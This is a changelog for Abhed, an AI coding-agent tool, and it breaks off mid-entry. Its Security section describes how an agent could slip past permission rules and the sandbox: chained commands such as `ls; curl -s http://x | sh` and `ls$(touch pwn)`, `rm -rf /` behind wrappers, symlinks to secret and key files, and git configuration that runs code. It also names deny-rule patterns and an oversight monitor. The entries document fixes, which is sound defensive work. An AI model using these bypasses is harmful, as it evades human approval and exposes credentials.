# Changelog

All notable changes to Abhed are recorded here. The format follows
[Keep a Changelog](https://keepachangelog.com/en/1.1.0/), and versions follow
[Semantic Versioning](https://semver.org/).

## [Unreleased]

### Upgrading

- `abhed -p` stopped by a hang-up (SIGHUP) now ends its run and exits 130,
  as for Ctrl-C and SIGTERM; the signal used to end it outright, and the
  shell saw 129.
- `npm install` and `npm test`, `go`, `make`, `cargo`, `kubectl`, `yarn`,
  `pnpm`, interpreters, package runners and any command behind a `VAR=value`
  assignment no longer get a one-click "Always allow"; approve them once
  instead. Allow rules in the configuration and `-allow` flags match exactly
  as before, and a remembered "Always allow" only ever lasted one session, so
  nothing saved is lost. To keep the old flow, write the rule yourself, such
  as `bash(go test*)`, inside a sandbox tier, since it approves whatever the
  agent writes into the tests or the Makefile. A refusal in a run with no one
  to approve no longer names a rule for these commands.
- `abhed resolve` pushes to the issue's repository over https, built from the
  issue URL, and ignores `-remote`. Its git runs without hooks, signing,
  filters (Git LFS included) or `GIT_*` variables; pass `-ca` rather than
  `GIT_SSL_CAINFO`. A change holding a nested repository is not committed. A
  global `insteadOf` that rewrites https to ssh now stops the push; add a
  matching `url.<https base>.pushInsteadOf` to keep pushes on https. The
  push runs outside the checkout, so `includeIf "gitdir:…"` sections of the
  global configuration no longer apply to it: use `-ca`, or host-scoped
  `http.<url>.*` settings. On the process sandbox tier, a push is refused
  when the global git configuration, or the folder it would be made in,
  lies in the run's worktree, a temp folder or a toolchain cache (a home
  directory under `/tmp`, say), and when `~/.abhed/push` is in one of those,
  is a file or a link, or is not your own (not checked on Windows). On the
  `none` tier, or in a container that mounts the home directory, the run can
  write both, and the push is not refused.
- A start with `auth.users_file` or `ABHED_SECRETS_FILE` pointing inside
  the workspace, an added directory, a temp folder or a toolchain cache is now
  refused, unless the file is under the workspace's or the home directory's
  `.abhed/`. Move it to a state directory outside them.
- The `approvals` table gains `answer_scope` and `ended_at`. With two
  database roles, run `abhed migrate` as the owner before starting the new
  server: it refuses to start on the older schema and says so. The migration
  closes the approval rows already in the table, whose turns are not waiting.
- An unbound answer (no `request_id`) to a session no node is running, or
  whose request has ended, now gets `409` instead of `204`: nothing was
  waiting on it.
- `abhed rpc`, `abhed acp` and `abhed resolve` now run `bash` in the
  configured sandbox tier, `process` by default. On a host without one
  (Linux without bubblewrap), a session no longer starts; install it, or set
  `sandbox.min_tier` to `none` for a trusted repository.
- A narrow `bash` allow rule no longer approves a chained or redirected
  command: `bash(go test*)` no longer runs `go test ./... | tee out` unasked.
  In a run with no one to approve (`-p`, CI, the SDK), such a command is now
  refused where it used to run. Split the rule into single commands, use
  `bash(*)` inside a sandbox tier, or approve interactively.
- A custom client of `POST /v1/sessions/{id}/pty` that ignores the new
  `confirm` response field fails closed: a destructive line is not run.
- Only a `bash` call that is just `cd <folder>` now carries its directory to
  the next call, for the agent and the line-by-line terminal. A chain such as
  `mkdir x && cd x` no longer does: send the `cd` as a call of its own.
- A turn waiting for approval when the server shuts down now ends with reason
  `shutdown`, not `user_interrupt`; a filter on `user_interrupt` no longer
  counts server stops.
- A client of `POST /v1/sessions/{id}/approve` should send the `request_id` of
  the `action.requested` event it answers. An answer sent with nothing pending
  now gets `409` instead of `204` (it was held and approved the next request);
  an answer recorded after its turn stopped waiting gets `200`
  `{"recorded":true,"applied":false}`; a bound answer on a node not running the
  session gets `421` with `Abhed-Session-Node`.
- `action.denied` now carries `by`, as `action.approved` does, and both say
  who settled the call: `policy`, `reviewer`, `user`, `session-scope` (with
  the remembered `scope`), `headless` or `system`. A refusal in a run with no
  one to approve (`-p`, `rpc`, an SDK run without an approver) is now
  `actor: system`, `by: headless`, with a reason starting `no approver:`,
  where it was `actor: user` and "rejected"; a filter on `actor: user` for
  reviewers' refusals no longer counts them. A call allowed by an earlier
  "always allow" is `by: session-scope`, not `by: reviewer`. A call that
  needed approval in a run that approves on its own (subagents, `abhed
  eval`) is `by: headless`, where it was `by: reviewer`.
- A request that ends while waiting for approval now records `action.denied`
  (`actor: system`, `by: system`, step `ask`); so does a call refused before
  approval because it could not succeed (step `precheck`), and a call to an
  unknown tool records `action.requested` and `action.denied` (step
  `unknown`). A consumer that pairs every request with an outcome no longer
  finds requests without one.
- A turn stopped before the model's first reply now ends as
  `user_interrupt` or `shutdown`, not `error`. A run ended by its own
  deadline, as `abhed eval` sets per task, now ends with the new reason
  `deadline` at any point, where it was `user_interrupt`: for `abhed eval`
  that is the `terminal_reason` in its report, not its exit status. For an
  embedder, `TerminalReason.ExitCode()` gives 7 for it; `abhed -p` never
  ends this way.
- A new event, `message.dropped`, records a steered message that a shutdown
  kept from being delivered. An `observation` of a `bash` call, the agent's
  or one run on a workbench terminal, now carries `sandbox`, the tier it ran
  under (`none` on the host).
- `abhed serve` now treats a hang-up (SIGHUP) as it treats SIGTERM, draining
  and ending turns, unless it was started with hang-ups ignored (`nohup`).
  `abhed -p`, the interactive CLI, `rpc`, `acp`, `eval` and `resolve` end
  their runs on Ctrl-C, SIGTERM or a hang-up. `rpc`, `acp`, `eval` and
  `resolve` then exit with 128 plus the signal's number (130, 143, 129), where
  the signal used to end them outright. `rpc` and `acp` first write the
  stopped prompt's events, its end included, and then its reply, so the reply
  is the last thing on stdout; a second signal exits at once. A stopped
  `abhed eval` runs no further task, prints no summary and writes no `-json`
  report, and a task whose run was interrupted or shut down never passes. A
  stopped `abhed resolve` keeps its worktree, as a failed run does, and says
  where. With the interactive CLI, `-p`, `eval` and `resolve`, a second
  signal after the first now ends them at once; `serve` ignores signals
  while it drains, so a second SIGTERM does not cut the drain short.
- An agent's `bash` command now runs in a session of its own, with no
  terminal. A command that reads `/dev/tty`, such as a `sudo`, `ssh` or git
  credential prompt, fails at once instead of waiting on the terminal of the
  person running the CLI; give it its input another way. On the host, an
  "Operation not permitted" result no longer carries the note that the
  sandbox denied it.
- `abhed` now refuses a word that is not a command, with exit code 2, where
  it used to open an interactive session, so `abhed version` looked like it
  had run; run a prompt with `-p`. `abhed version` now prints the version. An
  unknown `-output-format`, such as `stream-json`, exits 2 with the valid ones
  named instead of printing text: the formats are `text` and `json` (one
  event per line).
- A piped interactive session that answered an approval with an empty line
  now has to send `a` or `y`: an empty line no longer accepts.

### Added

- In the SDK: `NoteAnswer` and `Answer`, for an approver to say who settled
  a call when no person was asked, and the `By` values it takes
  (`ByPolicy`, `ByReviewer`, `ByUser`, `BySessionScope`, `ByHeadless`,
  `BySystem`); `DroppedMessage` and `EvMessageDropped` for the new
  `message.dropped` event; `TermDeadline` for the new `deadline` terminal
  reason. See [the SDK guide](docs/guide/09-sdk.md#who-settled-a-call).
- `Agent.Flush` in the SDK waits until `OnEvent` has returned for every
  event recorded before the call, or its context ends. `OnEvent` is now
  given every event, in order, however slow it is; before, events recorded
  while it was busy could be dropped, and so could one recorded the moment
  `New` returned. Give `Flush` a deadline, and do not call it from `OnEvent`.
- The line-by-line workbench terminal completes a file or folder name on Tab,
  from the workspace listing and relative to the terminal's directory; a
  second Tab lists the candidates. Nothing is run to complete. Names are
  quoted as bash quotes them, and a name with control, invisible or
  text-direction characters is never offered, so a completed line runs as
  it reads; nothing is completed inside an open quote, open backticks or
  an open `$(`. Ctrl \` leaves the terminal from the keyboard, now that Tab
  stays in it.

### Changed

- `server.ApprovalStore` changed for the approval fixes below: `AnswerApproval`
  takes the answer's scope, `ApprovalResult` returns it, and `EndApproval` is
  new. `store.Postgres` implements the new methods, and `store.Approval` gains
  `AnswerScope` and `Ended`. A store written against the old interface must
  add them.
- `agent.NewUndoLog` takes the functions that restore and remove a file;
  both are required, and the CLI and the server pass the session's
  `RestoreFile` and `RemoveFile`. Undo without them refuses rather than
  writing by path.
- `sandbox.Policy` gains `StatePaths`, the state files a configuration keeps
  outside `.abhed/`, which the process sandbox also denies to commands. A
  start with one where commands can write is refused (see Security).

### Fixed

- The container sandbox tier failed every command on Docker, which refuses
  `--uts private`; it now runs there as it does on Podman. The sandbox's
  hostname is now always `abhed`, and on Podman its PID and UTS namespaces
  are pinned private whatever `containers.conf` says.
- On Debian and Ubuntu, the container image included, commands linked
  through `/etc/alternatives` (`vi`, `vim`, `editor`, `awk` and others) could
  not start in the Linux process sandbox.
- A request that ended while waiting for approval, by an interrupt, Send
  now, a shutdown or a deadline, recorded no outcome: the record went from
  `action.requested` straight to `session.ended`. It now records
  `action.denied` saying why no one answered, such as "interrupted before an
  answer" or "server shut down before an answer".
- The record credited a reviewer who was never asked. A refusal in a run
  with no one to approve read as a person's rejection, and a call allowed by
  an earlier "always allow" read as a reviewer's approval with no scope. Each
  now says who settled it, and the scope that allowed it.
- A turn stopped before the model's first reply, by an interrupt, Send now or
  a shutdown, was recorded as `error`, as if the model had failed.
- Stopping a turn, or the server, did not stop an approved long-running
  command: the turn ended only when the command did, and on SIGTERM what the
  command started could outlive the server. A cancel now kills everything
  the command started while it runs, in every sandbox tier, and removes a
  container command's container. A job the command leaves running in the
  background after it exits is not killed, but no longer holds the call
  open, and the result says it is still running. Closing the terminal the
  CLI runs in, or losing the ssh session, ends the command the same way.
  A command stopped by the run's own time limit says so, instead of
  suggesting a longer `timeout_ms`.
- A message steered into a running turn (202 "steered") just before a
  shutdown was lost with no trace. It is now recorded as `message.dropped`.
  It is still not delivered after a restart.
- When a shutdown ended a command on an idle workbench's terminal, its result
  was recorded after the session's end. It is now recorded before it.
- A call to a tool that does not exist left no action on the record, only
  the model call that asked for it, and a call refused before approval
  because it could not succeed (a relative path, an edit whose text is not
  in the file) left its request with no outcome.
- HawkEYE showed a call with no result as run (✓), including one whose
  approval was never answered; it is now marked not run. A command the
  sandbox refused part of is marked and raises a `sandbox-denied` finding,
  for records that say the command ran under a sandbox.
  HawkEYE says who decided from the event itself, so the person's own
  decline at the line terminal no longer reads "by reviewer", and a headless
  refusal or a remembered scope no longer counts as asking a reviewer.
- Ctrl-C in an interactive session did nothing while a turn was running or
  an approval was waiting, though the banner says it interrupts. It now
  stops the turn and refuses a waiting approval; a turn stopped at an
  approval, a running command or while waiting for the model ends as
  `user_interrupt`. At the prompt Ctrl-C still only clears the line; Ctrl-D
  exits. A second Ctrl-C during a turn that has not stopped ends the session
  with exit code 130.
- The agent's `bash` refused `vim -es`, `vim -e -s`, `vim -E -s` and other
  silent Ex mode edits as interactive. They run a script and exit, so they
  now run; `vim` without them, `vim -e` or `vim -s` alone, and `-s` before
  `-e` (a file of keys, not silent mode) are still refused. An allow rule
  such as `bash(vim -es*)` allows any command, through `:!`.
- The "always allow" offered for `python3 -m unittest -q test_calc` was
  `bash(python3 *)`, which also approved `python3 -c …`. A one-click
  always-allow is now offered only for a short list of well-understood tools
  and subcommands (`git status`, `git commit`, `ls`, `cat`, `grep`, `mkdir`,
  `npm ls`, `docker ps` and a few more, listed in the permissions guide);
  anything else can be approved once or allowed with a rule you write.
  `npm install`, which used to be offered one, is not: it runs package
  scripts. Nor is a command with a `VAR=value` assignment in front.
- Send now during a server drain took the message out of the queue before the
  server refused it, so it was lost to the server and kept only in the page.
  The workbench now asks `/v1/health`, which reports `draining`, and leaves
  the message queued; if the drain starts in between, it says the message is
  no longer queued and puts its text back in the message box.
- The workbench kept showing "connected" after the server had gone. A dropped
  event or shell stream, or a request that cannot reach the server, now shows
  "reconnecting…" or "offline" until the server answers again.
- In the line-by-line workbench terminal, `vi` seemed to hang after `:wq`:
  the process sandbox refuses writes to the home directory, and vim waited at
  "Press ENTER" after failing to save its history file. Every process-tier
  command, the agent's included, now starts vim with that file turned off,
  after reading the person's own vimrc (a vim without scripting, such as
  vim.tiny, reads none). Neovim's history file is turned off the same way,
  untested. On Linux the sandbox shows no home directory, so vim there runs
  with its defaults.
- Tab in the line-by-line terminal moved focus out of it, to the agent's
  composer, so the next keys went there. Esc, Left and Right no longer put
  `[D`-style text into the line, and a program that is killed no longer
  leaves its screen or key modes behind for the line prompt.
- A `cd` whose folder name was quoted, as `web\ app` or `"web app"`, left
  the line-by-line terminal where it was without a word, so the next line
  ran in the old folder. The quoting is now read as bash reads it, and a
  bare `cd` goes to the workspace root instead of doing nothing.
- The tracked directory, for the line-by-line terminal and the agent's
  commands alike, now moves only for a line that is just `cd <folder>`. It
  used to follow the last `cd` of a chain such as `mkdir x && cd x`, and
  could land in the wrong folder when an earlier part of the line had
  changed directory. A line with `cd`, `pushd`, `popd`, `CDPATH`, `eval` or
  `source` in it, or a `cd` to a folder that is missing or cannot be read
  with confidence, leaves it where it was and says so, naming where the next
  line runs; the agent's result carries the same note. Commands run without
  a sandbox no longer get the server's `BASH_ENV` or `CDPATH`.
- On a phone, the sign-in page's header lost its side margin, so the logo sat
  against the left edge of the screen.
- Between phone and desktop widths the console header was wider than the
  screen and the page scrolled sideways. From 761 to 1180 pixels it now shows
  the mark without the wordmark and "console" label, the health light (its
  text stays for screen readers), and no active-session count or Password
  link (for local accounts the signed-in name links to the account page);
  the model picker and Switch stay. At every width the header items keep
  their size and the signed-in name shrinks into what is left, so a long name
  no longer pushes Sign out off the screen.
- On a phone the console had no model picker and no Switch link, which an
  identity-provider sign-in needs to change user; both now sit at the foot of
  the chat rail. The header shows the health light, and below 400 pixels
  leaves the Admin link to the landing page. The workbench keeps its Switch
  link at every width.
- Stopping the server (SIGTERM) while a turn was running, most often while it
  waited for approval, could exit before the turn recorded `session.ended`,
  so the session listed as running forever. The server now waits, up to five
  seconds, for cancelled turns to record their end before it returns, and a
  turn waiting for approval no longer waits on a slow approval write once
  cancelled. Such a turn ends with reason `shutdown`, as other cancelled
  turns do, where it used to record `user_interrupt`, and so does a turn
  stopped before the model's first reply. A turn started by a
  message to an open session, which is every workbench turn, is now ended
  on shutdown too; before, the server waited on it and exited with no end
  recorded. While the server is stopping, a message to a session gets 503
  with `Retry-After`, whether it would start a turn, steer a running one or
  send it now, and a Send now no longer stops a turn the drain is letting
  finish.
- In a workbench session whose event stream was already open, for example
  after opening a terminal, the first message that needed approval stayed at
  "Thinking" and never showed Allow or Deny, so the run waited for an answer
  no one could give. The prompt now shows on the first turn, after Send now,
  and when the page opens on a session that is waiting for approval.

### Security

- Keys typed while the interactive approval prompt was showing answered it:
  "Wait, stop", typed as the prompt appeared, approved a write with its `a`,
  and Enter on its own accepted. Now only one of the prompt's keys pressed
  on its own answers it: on an empty line, with at least 300 ms of quiet
  after the choices are drawn and after the previous key, and 300 ms after
  the key itself (600 ms for `A`, which allows for the whole session), so a
  sentence that starts with one ("Actually no") or a held-down key does not
  answer. A key followed at once by Enter shows the choices again, and Enter
  alone never accepts. Other typing is kept on the line and sent as a
  steering message on Enter, and the prompt says so.
- Project memory (`ABHED.md`, `ABHED.local.md`) was read with no check, so
  a link the agent planted there put `.abhed/users.json`, the secrets file or
  a file outside the workspace into the system prompt, and `/memory` printed
  it. Workspace memory files are now read as the file tools read; the
  operator's files in `~/.abhed` and `/etc/abhed` are read only when they
  are not links.
- The git commands Abhed runs itself on the host (the branch and change
  count in every prompt, worktrees for parallel runs, and a resolved issue's
  commit, diff and push) ran whatever the repository's own configuration
  named: an fsmonitor, hooks, clean and smudge filters, textconv and
  external diffs, a signing program, a credential helper or a transport. The
  agent can write that configuration, so it ran with the server's privileges
  outside the sandbox. The settings known to do so are now switched off in
  git's command-line scope, submodules are not entered, a change holding a
  repository of its own is not committed, and git's own environment
  variables are dropped. The list is best effort; running this git inside
  the sandbox is follow-up work.
- `abhed resolve` pushed with the forge token to whatever the named remote
  pointed at, which the run could change, sending the token to another host.
  It now pushes to an https address built from the issue, from a temporary
  repository with no configuration of its own, so the repository's
  configuration (TLS checks, proxies, address rewrites, transports allowed
  by name) no longer decides where the token goes; only the operator's
  global configuration applies.
- The line that keeps parallel-run worktrees out of `git status` was
  appended to `.git/info/exclude` through any link there, so a link to
  `.abhed/users.json` corrupted it. It is now written as the file tools
  write, and not at all when the git directory is outside the workspace.
- "Approve once" could become "always allow". A node reading an answer from
  the store, because it landed on another node or the turn read the row
  first, remembered the request's scope whatever the reviewer chose. The
  approval row now keeps the scope the answer carried (`answer_scope`), and
  only an answer that chose "always allow" widens the session.
- An approval row stayed open after its request ended unanswered
  (interrupted, shut down, timed out or its turn failed), including one
  written after the turn gave up waiting for it. After a restart, an answer
  with no `request_id` then marked it approved with `204` though nothing
  was waiting, and the record showed an approval no one acted on. A request
  now closes its row when it ends (`ended_at`), a closed row takes no
  answer, and an unbound answer on a node not running the session is
  recorded only when another node is running it.
- `abhed rpc`, `abhed acp` and `abhed resolve` ignored the workspace's
  `sandbox` configuration: `bash` ran on the host with the operator's whole
  environment, the model's API key variable included, and could write outside
  the workspace. They now run it in the configured tier, as the terminal does,
  and refuse to start a session when no backend meets `sandbox.min_tier`. The
  SDK gains `Options.Sandbox` to ask for the same; without it, and without a
  managed `sandbox` setting, an embedded agent still builds no sandbox.
- A command run without a sandbox (the `none` tier, and the unsandboxed
  fallback of the bash tool and the workbench terminal) no longer inherits
  the server's exported bash functions (`BASH_FUNC_*`), `SHELLOPTS` or
  `BASHOPTS`, alongside `BASH_ENV` and `CDPATH`. An exported `cd` or `pwd`
  function ran in place of the builtin, and `SHELLOPTS` changed how every
  line was run.
- Abhed's own state (`.abhed/`, and a users or secrets file configured
  elsewhere) could be reached under another name. On a case-insensitive disk,
  the macOS default, `.ABHED/users.json` and `.Abhed/config.json` open the
  files in `.abhed/`; a file or folder symlink in the workspace pointing into
  it did the same, even one whose target did not exist yet. Through these the
  agent's read, write, edit and a followed `cd` reached it, and so did the
  server's `download`, `file`, `tree` and `search` endpoints, which returned
  the password hashes in `users.json`. Every one of them, and the rest of the
  workbench's path endpoints, now uses one check: names compare without case,
  both the path as given and the path with every link followed are judged,
  and the filesystem is asked whether the path or a folder above it is a
  state directory or a state file. A link swapped in between that check and
  the open is caught too: files are opened under the workspace root held
  open, each folder is judged by identity once opened, and what was opened
  is judged again (see the entry on leaving the workspace below). An upload
  is refused when its folder leads out of the workspace or into the state.
  A hardlink is recognised for the users, config and secrets files, and for
  up to 4,096 other files and folders in the state directories.
- A users file set with `auth.users_file`, or a secrets file set with
  `ABHED_SECRETS_FILE`, could sit where sandboxed commands write, such as a
  folder in the workspace or a temp folder, and be read or replaced. Abhed
  now refuses to start when one does, unless it is under the workspace's or
  the home directory's `.abhed/`; a path that does not exist yet is judged
  by its deepest existing folder, with links followed.
- `glob`, `grep` and the code index followed file symlinks with no check, so
  a link in the workspace to `~/.ssh/id_rsa` or into `.abhed/` was searched
  and printed. `grep` and the index no longer read through links, and none of
  them read a file that is a state file under another name (a hardlink, as
  bounded above) or descend into `.abhed/`; `glob` lists a link only when a
  read of it would be allowed. A write through a link whose target does not
  exist yet is judged by where the target would be.
- `read`, `write`, `edit` and `/undo` could leave the workspace through a
  folder swapped for a link after the path was checked, which a background
  command can do: a read returned a file outside, a write or an undone edit
  replaced one, and an undone creation removed one, including
  `.abhed/users.json`. Files are now opened, written, removed and
  snapshotted under the workspace root held open as an `os.Root`, following
  links only while they stay inside it; the same holds for `/diff`, the
  server's download, viewer, save and upload, and the code index. A link
  into a directory added with `--add-dir` is used in that directory.
- An approval could answer a different request from the one it was shown
  for. `POST /v1/sessions/{id}/approve` named no call, so after Send now a
  click on the interrupted run's prompt approved the new run's call; and an
  answer sent while nothing was pending was held and approved the next
  request unasked. The endpoint now takes an optional `request_id`, the `id`
  of the `action.requested` event being answered (a model's `call_id` is not
  used, because models repeat it across turns):
  - On the node running the session, the reply says what became of the
    answer: 204 the waiting turn took it; 200
    `{"recorded":true,"applied":false}` it was recorded on the store but the
    turn stopped waiting first (it was interrupted or timed out), so nothing
    ran on it; 409 it was refused; 429 too many answers are waiting, retry;
    400 its scope was not the one offered;
    503 the request's row was not written within 30 seconds.
  - An answer naming another request, or one that has ended, is refused
    with 409 "that approval is no longer pending", and is neither taken nor
    recorded. An answer that arrives with an interrupt is refused the same
    way, or reported as recorded but not applied if it reached the store,
    unless the turn took it first.
  - An answer with nothing pending is refused with 409 "no approval is
    pending for this session" and is no longer held. An answer naming a
    request not yet published waits up to two seconds for the turn to
    publish it, then gets that 409. Once published, it waits up to 30 seconds
    more for the request's row to be written, then gets 503. At most eight
    answers wait per session; more get 429 "too many answers are waiting
    for this session" with `Retry-After`, and the workbench and console keep
    the prompt and say "Busy, try again".
  - An answer's `scope` ("always allow") must be empty or the scope the
    request offered; any other is refused with 400, so a client cannot
    widen what is remembered for the session.
  - Two answers at once, with or without a store: one is taken and the other
    refused with 409, so a Deny is never acknowledged while the turn runs the
    Allow. The refusal says "this approval was already answered", or "that
    approval is no longer pending" when it arrives after the turn has moved
    on; which one depends on timing, and a client should treat both alike.
    With a store, the answer is recorded on that request's own row, not the
    session's newest, and the first recorded decides.
  - On a node that is not running the session, an answer naming a request is
    not recorded, since the stored row cannot be checked against it; the
    reply is the usual 421 with `Abhed-Session-Node`, so it can be sent to
    the node that is, or 404 when routing is off. Storing the request id on
    the approval row, so any node can check it, is a follow-up.
  - An answer without `request_id` still answers the pending request, as
    before, on any node; on another node its 204 means it was recorded on
    the store for the running node to read. Clients should send
    `request_id`, as the workbench and the console now do.

  The workbench and the console also settle a prompt the server refuses an
  answer for (409, or 421 with a note that it must be answered on the server
  running the session), and the workbench settles a run's open prompts when
  the run ends, so they can no longer be clicked.
- A `bash` allow rule no longer approves a chained command. With
  `bash(ls*)`, `ls; curl -s http://x | sh`, `ls && python3 -c ...`,
  `ls$(touch pwn)` and `ls > important.txt` were approved without asking. An
  allow rule now approves only a command with none of `;`, `&`, `|`, a
  newline, `$(`, `${`, a backtick, `<`, `>`, `(` or `)`, even inside quotes;
  any other command falls through to a prompt. `bash`, `bash(*)` and `*`
  still allow every command. An allow rule such as `bash(cd x && go test*)`
  therefore no longer matches anything, and loading a configuration with one,
  or adding one through the SDK's `Options.Allow`, writes a warning naming it.
- A chained command is offered no "always allow" scope. A remembered scope is
  looked up by name, so after "always allow `bash(git status *)`",
  `git status && curl x | sh` was approved without asking.
- `bash` deny and ask rules match each command in a chain as well as the whole
  line, including commands inside `$(...)`, backticks and subshells:
  `bash(rm -rf /*)` now denies `ls; rm -rf /`. Each command is also matched
  past leading `VAR=value` assignments, redirections and the wrappers `env`,
  `command`, `exec`, `nohup`, `nice`, `builtin`, `sudo`, `doas`, `coproc`,
  `time`, `timeout` (and its duration), `xargs`, `setsid`, `stdbuf` and
  `ionice` with their options, named bare or by path (`/usr/bin/sudo`), so it
  denies `sudo -n rm -rf /` and `timeout -s KILL 5 rm -rf /`. Whether an
  option takes a value is not known, so both readings are matched; a lone `-`
  (`env -`) is an option. The split does not parse quoting, so it can only
  add a denial or a prompt. Its work is linear in the command's length, and a
  command it cannot split in full (over 64 KiB, over 1,024 parts, or a
  wrapper with more than 16 readings) is asked about in every mode, with the
  new step `screen`, while any `bash` deny or ask rule has a pattern.
- A `*` in any rule now matches newlines. Before, a newline anywhere in the
  subject took it past every deny rule bounded by `*`: `bash(*mkfs*)` did not
  deny `echo` and `mkfs /dev/x` on two lines, nor `read(*secret*)` a path with
  a newline in it. An allow rule with a narrower pattern than `*` still never
  approves a subject with a newline in it.
- Workbench: in the line-by-line terminal (`sandbox.terminal: "lines"`), a
  destructive command, one the policy always confirms, is no longer run on
  Enter. The terminal shows the reason and asks `Run it? [y/N]`; only `y` runs
  it, recorded as `action.approved` with `"confirmed": "true"`, and anything
  else is recorded as the person's declined `action.denied` and drops the
  lines queued behind it. `POST
  /v1/sessions/{id}/pty` answers such a line with `confirm` and runs nothing
  until it is sent again with `"confirmed": true` (or `"declined": true`), so
  a client that sends neither never runs it; `"declined": true` for a line
  that needed no confirmation runs and records nothing. Other lines, the
  Explorer and the interactive terminal are unchanged.

## [1.1.2] - 2026-09-25

### Changed

- The terminal carries the new mark: the startup banner draws the Abhed A,
  and the accent the CLI uses for the prompt, tool calls, headings and inline
  code is the brand orange instead of cyan.
- The HawkEYE report uses the console's ink, paper and orange palette in both
  themes.
- The page shown when sign-in is not configured carries the Abhed lockup.
- On a phone, the console and workbench headers show the mark alone, and
  neither page scrolls sideways: the console drops its "console" label and
  Password link, and the workbench drops its Password, Switch and classic
  console links. On both, the signed-in name links to the account page.

### Fixed

- The documentation embedded in the binary linked web fonts, so a connected
  machine made a request to another host when the docs were opened. It now
  uses the system fonts and loads nothing from outside, whichever way the
  binary was built; a test holds it there.

## [1.1.1] - 2026-09-25

### Changed

- The web console, the sign-in page, the workbench, the account page and the
  embedded documentation carry the new Abhed and Zybuu marks and an ink, paper
  and orange palette, with a dark theme designed alongside the light one. On
  the console, sign-in, workbench and account pages the images are embedded in
  the binary as data URIs, so those pages still load nothing from anywhere; no
  route was added.
- The sign-in page shows the mark in place of the animated network, and it
  keeps still under reduced motion.
- `/favicon.ico` is now a PNG; `/favicon.svg` remains an SVG.
- The lockups and marks in `brand/` are PNG files; the SVGs were removed.

## [1.1.0] - 2026-09-24

### Added

- `hawkeye.AnalyzeWith` and `hawkeye.Options`, for what the caller knows
  beyond the record (`Live`: the session is still running there), and
  `hawkeye.Call.Actor` (`actor` in the JSON report): whether the model or a
  person made the call. `Analyze` is unchanged.
- `config.Config.ManagedKeys`, the settings the managed file set as dotted
  paths, and `Config.ManagedSets` to ask about one; `config.Overrides`,
  `Config.Apply`, which lays a caller's overrides over a configuration so
  they may tighten the managed settings and never loosen them, and
  `config.ManagedError`, the refusal it returns; `config.LoadManaged`, the
  defaults with only the managed file applied.
- A configuration key that nothing reads is reported: it is still ignored, so
  every configuration that loaded before still loads, but each one is written
  to standard error once, with its file, its JSON path and, when a known key
  is close, the one probably meant (`model.provider` → `model.default`).
  `abhed doctor` lists them and fails. Keys starting with `_` or `$`
  (`_comment`, `$schema`) are annotations and never reported; one in the
  managed file says so. `config.Config.Unknown` carries them, and
  `config.UnknownKey.Managed` marks one found in the managed file.
- `GET /account`, where a local-accounts user changes their own password, and
  `switch_url` and `password_url` in `/v1/whoami`, naming the routes this
  deployment has for switching user and changing a password.
- Workbench: a **Search** view across the workspace, with match case, whole
  word and RE2 regular expressions, results grouped by file and opened at the
  line (`GET /v1/sessions/{id}/search`). It reads only what the Explorer shows
  and passes over the folders `grep` does; it stops at 2,000 results, 20,000
  files or five seconds and says which, marks a file cut at 100 matches, and
  runs at most two at once per session.
- Workbench: the Explorer makes new files and folders, renames (F2) and
  deletes, from its toolbar and a right-click menu (`POST
  /v1/sessions/{id}/folder`, `/rename`, `/delete`). Each is recorded as the
  person's own command and held to the bash rules and the sandbox. Every
  path it touches, as named and with links followed, and everything inside a
  folder at its old and new path, must be one the workbench would open and a
  save to which the write rules allow.
- Workbench: save all (⌥⌘S / Ctrl Alt S), close the editor tab (⌘W / Ctrl W
  where the browser passes it on), Ctrl \` for the terminal, ⇧⌘F for search,
  the file's path and the cursor above the editor, a prompt before leaving
  with unsaved edits, and open tabs restored after a reload.
- `web/ide/editor.js` has a documented, empty seam where a language server
  will attach; nothing is registered yet.
- `edit` and `write` parse Go, JSON and Python before writing, where a parser
  is available (see the tools guide for Python's conditions). A change that
  would leave a file that parsed no longer parsing is not applied, and the
  model is told the error and the line; an `edit` whose new text is a pasted
  diff is refused the same way. Workbench saves are warned, never refused.
  HawkEYE reports a refused change as `broken-edit`. `tools.syntax_check`:
  `refuse` (default), `report` or `off`. It comes from sessions in which a
  model wrote diff markers into Python files.
- The `monitor` package and a policy step for it: a judge that reads the
  remit, the agent's reasoning and where a call's arguments came from, and
  may only tighten a decision; unavailable means ask, or deny when headless.
  Verdicts are recorded as `monitor.verdict`. The local-model judge follows.
- Workbench chat: a message shows as soon as it is sent, with a *Thinking…*
  line and seconds count until the reply starts; reasoning streams into a
  live block; replies render as markdown built from text, never markup. A
  message sent while the agent works is queued for the next step with **Send
  now** and **Cancel**, and marked delivered when the agent reads it. Esc
  stops a run only when pressed twice.
- `GET /v1/sessions/{id}/queue` and `DELETE /v1/sessions/{id}/queue/{qid}`
  list and withdraw queued messages. A follow-up to a busy session answers
  with a `queue_id`, and the `user.message` that delivers it carries the same
  id; `"interrupt": true` stops the running turn and sends the message fresh.
  A `client_id` on any post is echoed on its `user.message`. The queue routes
  and `/interrupt` answer `421` with `Abhed-Session-Node` for a session
  running on another node, as `/approve` does.
- `agent.reasoning.delta` events carry reasoning as it streams.
  `agent.reasoning` is unchanged and still follows with the whole text.
- The event stream takes `?after=<seq>` as well as `Last-Event-ID`.
- Hooks for the paid editions, all nil or unset by default so the Community
  Edition behaves as before: `auth.LocalAuth.Admit`, asked after a password
  checks out and before a session is issued; `auth.Middleware.Check`, run
  after any provider, token or proxy identifies someone, which ends a refused
  session and answers 403 with the reason (a browser goes to `/?refused=`),
  and which `/v1/whoami` and `/v1/overview` honour too; and
  `server.Options.AdminAudit`, told of every `/v1/admin/*` change. An MCP
  server's URL is recorded without credentials or query, and its command as
  the program alone.
- `auth.LocalAuth.Sessions` lists live local sessions by a digest of their
  cookie, never the cookie, with when each was created, last seen and
  expires; `EndSession` ends one by that digest. `auth.SessionEnder` lets a
  provider end a request's session without answering it.
- In `proxy` mode `/v1/whoami` reports the identity the proxy supplied, and
  the console and workbench show it. Sign-out appears only when the new
  `auth.proxy_logout_url` names the proxy's own.
- `auth.github.orgs`, `auth.github.teams` and `auth.github.allow_any`, for the
  paid editions' GitHub sign-in. Validated in every edition; the Community
  Edition does not otherwise read them.
- The workbench terminal is a shell: each tab is one interactive `bash` in the
  session's sandbox, at the workspace root, with history, completion, state
  between lines and full-screen programs. Tabs can be added, renamed and
  closed; resize, multi-line paste, Ctrl+C and a Kill button work; a banner
  states the sandbox tier, the workspace and the network, and the `none` tier
  is flagged in red. Opening the shell is a judged, recorded `bash` call;
  each line is screened against the deny rules as typed and recorded as the
  new `terminal.input` event. The docs say plainly that the sandbox is the
  boundary and the line checks are best effort. `sandbox.terminal: "lines"`
